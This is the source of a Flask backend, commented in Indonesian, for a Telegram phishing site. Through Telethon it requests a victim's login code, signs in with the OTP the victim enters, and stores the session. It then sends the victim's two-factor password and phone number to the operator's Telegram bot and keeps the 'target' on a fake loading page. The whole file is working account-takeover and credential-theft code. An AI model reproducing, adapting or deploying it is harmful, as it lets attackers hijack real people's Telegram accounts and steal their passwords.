import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Membuka izin akses dari semua origin agar tombol tidak macet
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel Dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # Step 1: Kirim OTP (Validasi Nomor)
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            return {"status": "success"}, 200

        # Step 2: Login/OTP (Deteksi 2FA)
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Jika butuh sandi, website akan otomatis pindah halaman
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "OTP Salah!"}, 400

        # Step 3: Sandi (Auto-Lolos ke Loading 24 Jam)
        elif step == 3:
            # Kirim log sandi ke Bot Telegram kamu
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": CHAT_ID, "text": f"🔑 Sandi: {sandi}\nNomor: {nomor}"})
            # Beri respon sukses agar target pindah ke halaman loading
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.after_request
def add_headers(response):
    """Memastikan header CORS selalu ada di setiap respon"""
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        return make_response(jsonify({"status": "error", "message": str(e)}), 500)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)